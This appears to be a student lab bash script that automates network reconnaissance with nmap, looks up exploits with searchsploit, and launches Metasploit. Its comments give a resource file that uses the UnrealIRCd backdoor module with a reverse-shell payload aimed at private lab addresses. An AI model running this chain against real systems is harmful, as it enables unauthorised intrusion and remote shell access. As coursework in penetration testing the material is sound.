#!/bin/bash

#Summary 
#Create a script that maps network devices for ports, services, and vulnerabilities.

#The user enters the network range, and a new directory should be created.
#The script scans and maps the network, saving information into the directory. Available tools: nmap, masscan
#The script will look for vulnerabilities using the nmap scripting engine, searchsploit, and finding weak passwords used in the network. Available tools: nmap, searchsploit, hydra, medusa
#At the end of the scan, show the user the general scanning statistics.



#i used '192.168.15.0-244' to scan. 
#This function scans your network range given by user and creates directory and list out all the available ip on the network. 
function enumeration ()
{
	echo "Please enter network ip range to scan: "
	read ip
	echo "You have entered the selected network range: $ip"
	mkdir -p network_"$ip"_scan
	cd network_"$ip"_scan
	pwd
	sudo nmap "$ip" -p- -O -sV -oN "$ip".scan 
	ip_list=$(cat "$ip".scan | grep Nmap | grep for | awk '{print $NF}')
	echo "Scans Completed. List of ip's are the following : $ip_list"
	}

#This function creates a sub-directory based on the given information of the network work scans.   
function directory ()

{
	scan1=$(cat "$ip".scan | grep Nmap | grep for | awk '{print $NF}' | tr -d '()' | awk 'NR==1')
	scan2=$(cat "$ip".scan | grep Nmap | grep for | awk '{print $NF}' | tr -d '()' | awk 'NR==2')
	scan3=$(cat "$ip".scan | grep Nmap | grep for | awk '{print $NF}' | tr -d '()' | awk 'NR==3')
	scan4=$(cat "$ip".scan | grep Nmap | grep for | awk '{print $NF}' | tr -d '()' | awk 'NR==4')
	
	mkdir -p $scan1
	mkdir -p $scan2
	mkdir -p $scan3
	mkdir -p $scan4
	}

#This functions executes scans of the given ip's and look for vulnerabilities. 
function NSE ()
{
	cd /home/hairkal/network_"$ip"_scan/$scan1
	mkdir scans 
	cd /home/hairkal/network_"$ip"_scan/$scan1/scans
	sudo nmap $scan1 -p- -O -sV -oN $scan1.scan -oX $scan1.xml
	sudo nmap $scan1 -p- -sV --script=vuln -oN vuln_$scan1.scan
	
	cd /home/hairkal/network_"$ip"_scan/$scan2 
	mkdir scans 
	cd /home/hairkal/network_"$ip"_scan/$scan2/scans
	sudo nmap $scan2 -p- -O -sV -oN $scan2.scan -oX $scan2.xml
	sudo nmap $scan2 -p- -sV --script=vuln -oN vuln_$scan2.scan
	
	cd /home/hairkal/network_"$ip"_scan/$scan3
	mkdir scans 
	cd /home/hairkal/network_"$ip"_scan/$scan3/scans
	sudo nmap $scan3 -p- -O -sV -oN $scan3.scan -oX $scan3.xml
	sudo nmap $scan3 -p- -sV --script=vuln -oN vuln_$scan3.scan
	
	cd /home/hairkal/network_"$ip"_scan/$scan4
	mkdir scans 
	cd /home/hairkal/network_"$ip"_scan/$scan4/scans
	sudo nmap $scan4 -p- -O -sV -oN $scan4.scan -oX $scan4.xml
	sudo nmap $scan4 -p- -sV --script=vuln -oN vuln_$scan4.scan
	}
	
#This function uses searchsploit. It uses Nmap xml result to search for exploits. 
function search_sploit ()
{		
	cd /home/hairkal/network_"$ip"_scan/$scan1/scans
	searchsploit -x --nmap $scan1.xml
	
	cd /home/hairkal/network_"$ip"_scan/$scan2/scans
	searchsploit -x --nmap $scan2.xml
	
	cd /home/hairkal/network_"$ip"_scan/$scan3/scans
	searchsploit -x --nmap $scan3.xml
	
	cd /home/hairkal/network_"$ip"_scan/$scan4/scans
	searchsploit -x --nmap $scan4.xml
	}
	
#This function runs msfconsole and execute the module base on the resource file. you will need to produce rc file. 
#module used for this exploit - exploit/unix/irc/unreal_ircd_3281_backdoor

#rcfile: 
#search irc
#use 18
#set rhost 192.168.15.143
#set payload payload/cmd/unix/reverse
#set lhost 192.168.15.134
#set lport 4441
#run

function exploit ()
{
	cd /home/hairkal/network_"$ip"_scan/$scan3
	xterm -e msfconsole -r exploit_irc 
	}
	

enumeration
directory
NSE
search_sploit
exploit
